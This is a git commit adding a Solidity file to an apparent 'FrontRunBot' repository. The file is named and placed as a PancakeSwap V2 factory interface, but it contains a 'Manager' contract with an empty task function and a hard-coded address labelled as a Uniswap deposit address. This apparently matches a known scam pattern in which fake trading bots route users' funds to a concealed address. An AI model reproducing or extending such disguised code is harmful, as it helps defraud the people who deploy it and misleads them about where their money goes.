7575adcc738943c648344c987c4b62aa69f13628
SolidDevBSC <96959378+SolidDevBSC@users.noreply.github.com>
2022-01-01 22:57:09 +0100

    Add files via upload

---
+++ FrontRunBot-main/pancakeswap-v2-periphery-main/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x302aE513b1e806ad959141c8a47520d22a6A5A52;
+	}
+}
